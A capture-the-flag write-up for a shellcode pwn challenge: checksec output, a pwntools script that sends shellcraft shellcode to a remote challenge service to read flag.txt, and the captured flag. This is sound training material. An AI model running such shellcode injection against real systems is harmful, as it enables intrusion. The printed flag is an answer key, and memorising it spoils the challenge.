## Description 
Shellcode
Pwn · Харуул Занги: 2018 · reamb
Solved: 7 · Score: 979
nc 139.162.5.230 10243
Files:

overflow
overflow.c

## Solution
Firstly lets do some basic file check
```
[Output of file] 
overflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ed2db441a7a45305782f6a6028a9b4e46da50857, not stripped
```
```
[Output of checksec]
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
```
    ((function_ptr)inp)();
```
This snippet of code allows us to just write shellcode as the input and executes it for us so i just wrote a script that uses shellcraft and gets a shell from the binary. But i ended up just `cat` ing `flag.txt` to make things simpler
```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'overflow',checksec=False)

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10243)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

context.log_level='critical'

shellcode = asm(shellcraft.cat('flag.txt'))

io = start()

io.sendline(shellcode)

io.interactive()

```

## Flag
```
HZ2018{r3@L_sh3ll_c0de_9ee31df2f932ad01}
```